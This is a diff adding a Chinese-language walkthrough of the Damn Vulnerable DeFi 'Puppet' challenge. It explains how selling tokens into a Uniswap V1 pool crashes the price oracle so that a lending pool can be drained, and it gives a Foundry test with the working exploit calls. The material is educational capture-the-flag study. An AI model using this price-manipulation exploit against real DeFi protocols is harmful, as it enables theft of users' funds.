@@ -505,3 +505,36 @@ forge test --match-contract Selfie -vvv
 forge test --match-contract Compromised -vvvv
 ```
 
+
+
+# #8 - Puppet
+
+合约:
+
+[PuppetPool.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/puppet/PuppetPool.sol) 借贷合约
+
+题目要求:
+
+有一个巨大的借贷池提供 DVT Token 借用,需要在存入两倍的借贷金额的 ETH  作为抵押品。该池目前有 100000 DVT 的流动性.
+
+Uniswap v1 合约目前有 10 ETH 和 10 DVT 的流动性的池子,从余额 25 ETH 和 1000 DVT 开始,从借贷池中窃取所有的 DVT 代币.
+
+解决方案:
+
+`PuppetPool` 合约对 DVT 代币价格的获取来自 Uniswap V1 的池子流动性做计算,而这样很容易就操纵价格,首先在 Uniswap V1 将 1000 DVT 售出,这几乎等于掏空了池子里的 ETH,使得 DVT 价格极低,再在 PuppetPool 以极低的价格 borrow 完池子里的 100000 DVT 代币.
+
+使用 foundry 编写测试:
+
+[PuppetPool.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/test/Compromised.t.sol) 
+
+ ```solidity
+     function testExploit() public {
+         vm.startPrank(attacker);
+         dvt.approve(address(uniswapExchange), type(uint256).max);
+         uniswapExchange.tokenToEthSwapInput(dvt.balanceOf(attacker), 9 ether, block.timestamp + 100000);
+         puppetPool.borrow{value: attacker.balance}(dvt.balanceOf(address(puppetPool)));
+         vm.stopPrank();
+         verfiy();
+     }
+ ```
+
